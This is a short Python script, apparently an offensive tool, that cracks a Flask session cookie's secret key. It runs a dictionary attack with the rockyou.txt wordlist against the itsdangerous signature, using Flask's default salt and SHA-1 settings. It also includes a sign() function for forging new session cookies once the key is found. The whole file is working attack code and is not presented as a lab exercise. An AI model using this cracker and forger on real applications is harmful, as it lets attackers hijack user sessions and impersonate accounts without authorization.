import hashlib

from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature
from flask.json.tag import TaggedJSONSerializer

# TODO: Add this to ask for user input
# Read cookie.example and set the contents to a variable 
with open('cookie', 'r') as f:
    COOKIE = f.read().strip()

# TODO: Ask for wordlist in user input
def crack_cookie():
    with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
        wordlist = f.read().splitlines()
    for word in wordlist:
        if verify(word, COOKIE):
            print(f'Found secret: {word}')
            break

def verify(secret: str, cookie: str) -> bool:
    """
    Verify a cookie
    :param secret: Secret key
    :param cookie: Cookie to verify
    :return: True if cookie is valid, False otherwise
    """
    try:
        get_serializer(secret).loads(cookie)
    except BadSignature:
        return False
    return True

def sign(data: dict, secret: str) -> str:
    """
    Sign a cookie
    :param data: Data to sign
    :param secret: Secret key
    :return: Signed cookie
    """
    return get_serializer(secret).dumps(data)
    
def get_serializer(secret: str) -> URLSafeTimedSerializer:
    """
    Encode a Flask session cookie
    :param secret: Secret key
    :param data: Data to encode
    :return: Encoded cookie
    """
    signer = TimestampSigner

    return URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=signer,
        signer_kwargs={
            'key_derivation': 'hmac',
            'digest_method': hashlib.sha1})

if __name__ == '__main__':
    crack_cookie()